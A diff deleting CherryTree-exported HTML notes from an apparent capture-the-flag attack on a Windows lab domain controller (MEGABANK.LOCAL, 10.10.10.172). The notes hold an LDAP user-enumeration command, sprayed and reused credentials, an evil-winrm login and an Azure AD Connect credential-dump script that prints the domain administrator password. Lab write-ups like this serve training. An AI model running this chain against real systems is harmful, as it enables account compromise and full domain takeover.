@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>enumeration</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>enumeration</h1><br/>dns showed me megabank.local. added to /etc/hosts<br /><br />DC=MEGABANK,DC=LOCAL<br /><br />ldapsearch -h 10.10.10.172 -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; &#39;(objectclass=person)&#39; sAMAccountName | grep -i sam | grep -v &quot;#&quot; | awk &#39;{print $2}&#39; &gt; users.txt<br /><br />smb loop2 got me the creds<br />SABatchJobs:SABatchJobs<br /><br />looking through users$<br />mhope:4n0therD4y@n0th3r$<br />/evil-winrm.rb -i 10.10.10.172 -u mhope -p &#39;4n0therD4y@n0th3r$&#39;<br /><br /><br /><br /><br /><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</a><br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; import-module .\Azure-ADConnect.ps1<br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; Azure-ADConnect -server 10.10.10.172 -db ADSync<br />[+] Domain:  MEGABANK.LOCAL<br />[+] Username: administrator<br />[+]Password: d0m@in4dminyeah!<br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; <br /></div></body></html>
